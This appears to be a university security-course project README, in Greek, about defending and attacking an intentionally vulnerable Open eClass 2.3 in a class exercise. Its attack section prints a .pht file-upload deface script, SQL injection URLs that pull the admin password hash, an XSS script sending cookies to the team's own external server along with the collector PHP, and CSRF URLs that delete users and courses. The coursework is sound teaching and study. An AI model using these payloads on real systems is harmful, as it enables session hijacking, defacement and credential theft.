## Open eClass 2.3

Το repository αυτό περιέχει μια __παλιά και μη ασφαλή__ έκδοση του eclass.
Προορίζεται για χρήση στα πλαίσια του μαθήματος
[Προστασία & Ασφάλεια Υπολογιστικών Συστημάτων (ΥΣ13)](https://ys13.chatzi.org/), __μην τη
χρησιμοποιήσετε για κάνενα άλλο σκοπό__.


### Χρήση μέσω docker
```
# create and start (the first run takes time to build the image)
docker-compose up -d

# stop/restart
docker-compose stop
docker-compose start

# stop and remove
docker-compose down -v
```

To site είναι διαθέσιμο στο http://localhost:8001/. Την πρώτη φορά θα πρέπει να τρέξετε τον οδηγό εγκατάστασης.


### Ρυθμίσεις eclass

- Database
  - Host : `db`
  - User : `root`
  - Password : `1234`
- Ρυθμίσεις συστήματος
  - URL του Open eClass : `http://localhost:8001/` (προσοχή στο τελικό `/`)
  - Όνομα Χρήστη του Διαχειριστή : `drunkadmin`


## 2020 Project 1

Εκφώνηση: https://ys13.chatzi.org/assets/projects/project1.pdf


### Μέλη ομάδας

- 1115201700040, Βασίλειος Καζάκος ([KazakosVas](https://github.com/KazakosVas))
- 1115201700152, Εμμανουήλ Στιβακτάς ([mansstiv](https://github.com/mansstiv))


## Defense

### SQL Injection
	
Στον αρχικό κώδικα υπήρχαν ήδη σε αρκετά σημεία σχετικές άμυνες μέσω filtering των input variables. Παρόλα αυτά για την ακόμη καλύτερη αντιμετώπιση χρησιμοποιήσαμε την τεχνική των <b>Prepared Statements</b> μέσω των συναρτήσεων της mysqli και για τις numeric input variables την συνάρτηση <b>intval()</b>. 

 * ```Prepared Statements``` <br>Χρησιμοποιήσαμε την τεχνική σε όλα τα αρχεία που μπορεί να εισάγει ο εκπαιδευόμενος κάποιο κείμενο.

 * ```intval()``` <br>Χρησιμοποιήσαμε την συνάρτηση αυτή σε όλα τα αρχεία που μπορεί να εισάγει ο εκπαιδευόμενος κάποιον ακέραιο.


### Cross-site Scripting (XSS)

Σε όλα τα πεδία που μπορεί να εισάγει κείμενο ο χρήστης έχουμε χρησιμοποιήσει την συνάρτηση ```htmlspecialchars()``` για να φιλτράρουμε τις λέξεις και να μετατρέψουμε τα special characters, όπως '<', '>' σε HTML entities. Έτσι αποτρέπουμε τον χρήστη από το να εκτελέσει κακόβουλα scripts. <br><br>
Να σημειωθεί πως η συνάρτηση χρησιμοποιείται μόνο <b>πριν βάλουμε τα δεδομένα στην βάση μας</b>. Γνωρίζουμε παρόλα αυτά πως αντ' αυτού, η χρησιμοποίησή της μόνο πριν την εκτύπωση των δεδομένων στο output ίσως είναι ακόμη καλύτερη τεχνική, αλλά επειδή τα αρχεία ήταν πολλά, φοβηθήκαμε την πιθανότητα να μας ξεφύγει κάποια εκτύπωση και για αυτό την χρησιμοποιήσαμε με τον συγκεκριμένο τρόπο. <br><br>
Επίσης, ειδική αναφορά αξίζει να κάνουμε στην μεταβλητή <b>$_SERVER ['PHP_SELF']</b>. Παρατηρήσαμε πως χρησιμοποιείται σχεδόν σε όλα τα αρχεία και είναι αιτία που ο επιτιθέμενος μπορεί να τρέξει XSS attacks μέσω του url. Παρόμοια ευπάθεια υπάρχει και στην φόρμα αλλαγής γλώσσας.

### Cross-Site Request Forgery (CSRF)

Για την άμυνα στα CSRF χρησιμοποιούμε σε κάθε post και get (που κάνει κάποια αλλαγή) request ένα ```random generated token``` το οποίο έχει κρυπρογραφηθεί με τον <b>αλγόριθμο sha256</b> και κλειδί το <b>cookie</b> του εκάστοτε λογαριασμού. Σε περίπτωση που το token που σταλθεί δεν είναι το σωστό, αποσυνδέουμε αυτόματα τον χρήστη.<br><br> 
Αυτό το κάνουμε, καθώς γνωρίζουμε πως κάτι τέτοιο θα συμβεί μόνο στην περίπτωση που κάποιος κακόβουλος χρήστης θελήσει να μαντέψει μέσω κάποιου brute force το token και να πραγματοποιήσει csrf attack. Οπότε κατά αυτόν τον τρόπο, του αφαιρούμε αυτήν την δυνατότητα και προστατεύουμε κατάλληλα το site μας.

### Remote File Inclusion (RFI)

Στον αρχικό κώδικα φαινόταν πως ύπηρχε κάποιου είδους άμυνα απο RFI. Αυτό όμως δεν ισχύει καθώς ο χρήστης μπορούσε να δει το file tree να βρει το αρχείο του και να το τρέξει. Επιπλεόν η συνάρτηση uniqid() που χρησιμοποιήθηκε για να δώσει τυχαίο όνομα στο αρχείο δε θεωρείται αξιόπιστη συνάρτηση για τη παραγωγή πραγματικά τυχαίων συμβολοσειρών, καθώς βασίζεται στον τωρινό χρόνο σε microseconds. Για αυτούς τους λόγους αμυνθήκαμε με τους ακόλουθους τρόπους:<br>

* ```Προσθήκη index.html σε κομβικούς φακέλους```<br>
Έτσι, ο χρήστης δεν θα μπορεί να περιηγηθεί στο file system και να ανακαλύψει το όνομα του φακέλου και του αρχείου που έχει ανεβάσει, ώστε να τα τρέξει.

* ```Χρήση πραγματικά τυχαίου ονόματος στους φακέλους και στα αρχεία (ανταλλαγή αρχείων && εργασίες)```<br>
Μέσω της συνάρτησης <b>openssl_random_pseudo_bytes()</b> είναι σχεδόν αδύνατο ο επιτιθέμενος να μαντέψει τα ονόματα των αρχείων που ανέβασε.

* ```Αλλαγή δικαιωμάτων του αρχείου```<br>
Ακόμη και αν αποκτήσει πρόσβαση στο όνομα του αρχείου μέσω κάποιου sql injection, σκοπός μας είναι να μην μπορέσει να το εκτελέσει. Αυτο το επιτύγχαμε δίνοντας μόνο <b>write permissions</b> στο αρχείο αυτό, μέσω του <b>chmod 0222</b>. Να σημειωθεί πως ο admin μπορεί να κατεβάσει κανονικά τα αρχεία, χωρίς το site μας να έχει χάσει κάτι από την λειτουργικότητά του.

* ```Προσθήκη σε κάθε αρχείο που ανεβαίνει, .txt extension```

* ```Απαγόρευση επικίνδυνων τύπων αρχείων```<br>
Σα μία τελευταία γραμμή άμυνας απαγορεύσαμε το ανέβασμα ορισμένων τύπων αρχείων όπως .php .js κλπ... .

## Attack

### Πως κάναμε το deface (RFI)
#### Target Team: ERROR-404

Aρχικά παρατηρήσαμε ότι δεν έχει προστατευτεί το μονοπάτι στο οποίο ανεβαίνουν τα αρχεία απο το work.php και το dropbox.php. Αντιληφθήκαμε επίσης πως το αμυνόμενο site μετατρέπει όλα τα .php αρχεία που ανεβαίνουν σε .txt. <br>

Για αυτό, χρησιμοποιήσαμε ένα διαφορετικό extension για php (<b>.pht</b> το οποίο τρέχει κανονικά σαν php) για το οποίο οι αμυνόμενοι δεν είχαν κανει μετατροπή σε
.txt. Στη συνέχεια με php, όπως φαίνεται και παρακάτω εύκολα αντικαταστήσαμε το αρχείο σύνδεσης openeclass/index.php με ένα δικό μας, με κάποιες επιπρόσθετες εκτυπώσεις. <br>

<b>Το αρχείο .pht που τρέξαμε: </b><br>
``` 
<?php
	echo getcwd();
	$where = '/var/www/openeclass/index.php'; 
	$from = 'updatedIndex.txt';
	$a=rename($from,$where);
	echo $a;
?> 
```
### SQL Injection

Τρέχοντας τα παρακάτω links, <b>εμφανίζεται ο encrypted κωδικός του drunkadmin</b> (δηλ. όπως αποθηκεύεται στην βάση). <br>

* ```http://error-404.csec.chatzi.org/modules/unreguser/unregcours.php?cid=TMA100'AND 0=1 UNION SELECT password FROM eclass.user WHERE username="drunkadmin" or'a'='a &u=4```
* ```http://error-404.csec.chatzi.org/modules/phpbb/reply.php?topic=2 AND 10=12) UNION SELECT password, password, password,password FROM eclass.user -- &forum=1```
* ```http://error-404.csec.chatzi.org/modules/phpbb/viewtopic.php?topic=2 AND 10 = 12 ) UNION SELECT password, password FROM eclass.user WHERE username="drunkadmin" -- &forum=1```

### Cross-site Scripting (XSS)

Ο τρόπος που εκμεταλλευτήκαμε τα <b>XSS attacks</b> είναι με το ακόλουθο <b>script</b> που έχει ως στόχο να στείλει τo cookie του αντιπάλου σε έναν δικό μας server, ο οποίος με την σειρά του θα αποθηκεύσει το cookie σε ένα αρχείο .txt. <br>

<b>To script που τρέξαμε:</b><br>
```
<script type="text/javascript">
	document.location='http://trojanponies.puppies.chatzi.org/cookie_stealer.php?c='+document.cookie;
</script>
```
<b>Το αρχείο cookie_stealer.php, που επεξεργάζεται το προηγούμενο αίτημα έχει τον ακόλουθο κώδικα:</b><br>
```
<?php
	if (isset($_GET["c"]))
	{
		$fp = fopen("stealed_cookies.txt", "a+");
		$cookie = $_GET["c"];
		fwrite($fp, $cookie . "\n\n");
		fclose($fp);
	}

	header("Location: http://error-404.csec.chatzi.org/");
?> 
```
#### Που βρήκαμε κενό για XSS ;

* Στον <b>xinha editor</b>, ενεργοποιώντας την επιλογή του <b>html editor</b>.<br> Ουσιαστικά, αυτό είναι αρκετά ισχυρό attack καθώς μπορεί να κλέψει το cookie κάθε χρήστη που έχει ανοίξει την συγκεκριμένη σελίδα (π.χ [Περιοχή Συζητήσεων](http://error-404.csec.chatzi.org/modules/phpbb/viewforum.php?forum=1), αν ανοίξεις το θέμα με τίτλο <b>Test3</b> θα τρέξουν οι κώδικες που αναφέρθηκαν προηγουμένως).<br><br>
* Στα ακόλουθα links:
	* ```http://error-404.csec.chatzi.org/modules/auth/courses.php/%22%3E%3Cscript%3Ealert(1)%3C/script%3E```
	* ```http://error-404.csec.chatzi.org/modules/profile/profile.php/%22%3E%3Cscript%3Ealert(1)%3C/script%3E```
	* ```http://error-404.csec.chatzi.org/modules/phpbb/index.php/'%3E%3Cscript%3Ealert(1)%3C/script%3E```
	* ```http://error-404.csec.chatzi.org/modules/phpbb/viewtopic.php?topic=1&forum=1/%27%3E%3Cscript%3Ealert(1)%3C/script%3E```
	* ```http://error-404.csec.chatzi.org/modules/admin/listusers.php/%22%3E%3Cscript%3Ealert(1)%3C/script%3E```
	* ```http://error-404.csec.chatzi.org/modules/admin/listcours.php/%22%3E%3Cscript%3Ealert(1)%3C/script%3E```
	* ```http://error-404.csec.chatzi.org/modules/admin/addfaculte.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E```
	* ```http://error-404.csec.chatzi.org/modules/agenda/myagenda.php/%22%22%3E%3Cscript%3Ealert(1)%3C/script%3E```
<br><br>
* Μπορούσαμε να βάλουμε και άλλα links αλλά η λογική είναι η ίδια (εκμεταλλευτήκαμε την μη προστασία της μεταβλητής ```$_SERVER['PHP_SELF']``` και της ```φόρμας αλλαγής γλώσσας```). 
<br><br>
* Τα XSS τα δοκιμάσαμε μόνοι μας, αφού είχαμε ήδη κάνει deface το αντίπαλο site και είχαμε πρόσβαση στον μη κρυπτογραφημένο κωδικό του drunkadmin. 

### Cross-Site Request Forgery (CSRF)

Εφόσον αποκτήσαμε πρόσβαση στον drunkadmin, μας δόθηκε η οδηγία να δοκιμάσουμε τα CSRF attacks μόνοι μας, χωρίς να στείλουμε email. Γνωρίζοντας λοιπόν τις φόρμες που δεν έχουν προστατευτεί σωστά, εστιάσαμε σε αυτές και δοκιμάσαμε να κάνουμε <b>CSRF attack με post request</b> σε 2 φόρμες, δημιουργώντας αντίστοιχα τις 2 ιστοσελίδες κάτω από τον φάκελο puppies για τις φόρμες αυτές.
<br><br>
Να τονιστεί πως οι φόρμες του site puppies είναι αρκετά ρεαλιστικές, με στόχο να μην αντιληφθεί ο drunkadmin πως σχετίζονται με επιθέσεις στο site του. Για να δουλέψουν, αρκεί να κάνει ένα click στο κουμπί που υπάρχει στην σελίδα και εννοείται να είναι ήδη συνδεδεμένος στο site του. Οι φόρμες μπορούν να βρεθούν στα ακόλουθα links: <br>

* ```http://trojanponies.puppies.chatzi.org/new_assignment.php``` : Δημιουργεί μία νέα εργασία <i>lololol</i> στο μάθημα (πρέπει ο drunkadmin να έχει κλικάρει το μάθημα).
* ```http://trojanponies.puppies.chatzi.org/new_page.php``` : Δημιουργεί έναν εξωτερικό σύνδεσμο <i>Puppies</i> στο αριστερό μενού (πρέπει ο drunkadmin να έχει κλικάρει το μάθημα).

Συνειδητοποιήσαμε επίσης, πως υπάρχουν αρκετά <b>CSRF attack με get request</b>, τα οποία μπορούν να προκαλέσουν σημαντικές αλλαγές στην λειτουργία του site, εφόσον κλικάρει ο drunkadmin τα αντίστοιχα url. Μερικά παραδείγματα είναι τα ακόλουθα: <br>
* ```http://error-404.csec.chatzi.org/modules/user/user.php?giveAdmin=3``` : Δίνονται δικαιώματα διαχειριστή σε μάθημα στον user με id=3 (αν ο drunkadmin έχει κλικάρει σε μάθημα).
* ```http://error-404.csec.chatzi.org/modules/admin/addfaculte.php?a=2&c=5``` : Διαγράφεται το Tμήμα 5.
* ```http://error-404.csec.chatzi.org/modules/admin/delcours.php?c=TMA106&delete=yes``` : Διαγράφεται ένα μάθημα που δημιουργήσαμε.
* ```http://error-404.csec.chatzi.org/modules/admin/unreguser.php?u=9&c=&doit=yes``` : Διαγράφεται ο χρήστης Τζένιφερ Άνιστον.

### Remote File Inclusion (RFI)
Το συγκεκριμένο attack αναφέρεται προηγουμένως στον τρόπο που κάναμε deface το αντίπαλο site. 

#### Team TrojanPonies:
<i>by [KazakosVas](https://github.com/KazakosVas), [mansstiv](https://github.com/mansstiv) </i>


